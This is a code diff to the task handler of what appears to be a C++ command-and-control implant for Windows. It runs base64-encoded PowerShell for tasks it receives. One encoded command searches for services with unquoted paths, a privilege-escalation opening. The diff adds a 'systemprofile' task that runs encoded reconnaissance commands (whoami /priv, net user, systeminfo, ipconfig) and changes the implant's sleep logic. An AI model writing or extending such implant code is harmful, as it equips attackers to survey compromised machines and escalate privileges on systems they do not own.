@@ -69,10 +69,10 @@ bool runTask(string outBuffer, DWORD dwSize)
         runPSCommand(outBuffer.substr(pipePos + 1));
     else if (cmd == "enumservices")
     {
-        string enumCommand{
+        string encodedCommand{
             "JABWAHUAbABuAFMAZQByAHYAaQBjAGUAcwAgAD0AIABnAHcAbQBpACAAdwBpAG4AMwAyAF8AcwBlAHIAdgBpAGMAZQAgAHwAIAA/AHsAJABfAH0AIAB8ACAAdwBoAGUAcgBlACAAewAoACQAXwAuAHAAYQB0AGgAbgBhAG0AZQAgAC0AbgBlACAAJABuAHUAbABsACkAIAAtAGEAbgBkACAAKAAkAF8ALgBwAGEAdABoAG4AYQBtAGUALgB0AHIAaQBtACgAKQAgAC0AbgBlACAAIgAiACkAfQAgAHwAIAB3AGgAZQByAGUAIAB7AC0AbgBvAHQAIAAkAF8ALgBwAGEAdABoAG4AYQBtAGUALgBTAHQAYQByAHQAcwBXAGkAdABoACgAIgBgACIAIgApAH0AIAB8ACAAdwBoAGUAcgBlACAAewAoACQAXwAuAHAAYQB0AGgAbgBhAG0AZQAuAFMAdQBiAHMAdAByAGkAbgBnACgAMAAsACAAJABfAC4AcABhAHQAaABuAGEAbQBlAC4ASQBuAGQAZQB4AE8AZgAoACIALgBlAHgAZQAiACkAIAArACAANAApACkAIAAtAG0AYQB0AGMAaAAgACIALgAqACAALgAqACIAfQA7ACAAaQBmACAAKAAkAFYAdQBsAG4AUwBlAHIAdgBpAGMAZQBzACkAIAB7ACAAZgBvAHIAZQBhAGMAaAAgACgAJABzAGUAcgB2AGkAYwBlACAAaQBuACAAJABWAHUAbABuAFMAZQByAHYAaQBjAGUAcwApAHsAIAAkAG8AdQB0ACAAPQAgAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAEMAbwBsAGwAZQBjAHQAaQBvAG4AcwAuAFMAcABlAGMAaQBhAGwAaQB6AGUAZAAuAE8AcgBkAGUAcgBlAGQARABpAGMAdABpAG8AbgBhAHIAeQA7ACAAJABvAHUAdAAuAGEAZABkACgAIgBTAGUAcgB2AGkAYwBlAE4AYQBtAGUAIgAsACAAJABzAGUAcgB2AGkAYwBlAC4AbgBhAG0AZQApADsAIAAkAG8AdQB0AC4AYQBkAGQAKAAiAFAAYQB0AGgAIgAsACAAJABzAGUAcgB2AGkAYwBlAC4AcABhAHQAaABuAGEAbQBlACkAOwAgACQAbwB1AHQAIAB9ACAAfQA="};
 
-        runEncodedPSCommand(enumCommand);
+        runEncodedPSCommand(encodedCommand);
 
         /*
 
@@ -103,7 +103,13 @@ bool runTask(string outBuffer, DWORD dwSize)
                 << "Error: " << e.what() << "\n";
         }
 
-        currentSleep = seconds * 100 ? seconds : currentSleep;
+        currentSleep = seconds * 10000 ? seconds : currentSleep;
+    }
+    else if (cmd == "systemprofile")
+    {
+        string encodedCommand{"dwBoAG8AYQBtAGkAIAAvAHAAcgBpAHYAOwB3AGgAbwBhAG0AaQAgAC8AZwByAG8AdQBwAHMAOwBuAGUAdAAgAHUAcwBlAHIAOwBzAHkAcwB0AGUAbQBpAG4AZgBvADsAZwBlAHQALQBwAHIAbwBjAGUAcwBzADsAaQBwAGMAbwBuAGYAaQBnAA=="};
+        // [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes("whoami /priv;whoami /groups;net user;systeminfo;get-process;ipconfig"))
+        runEncodedPSCommand(encodedCommand);
     }
 
     return true;
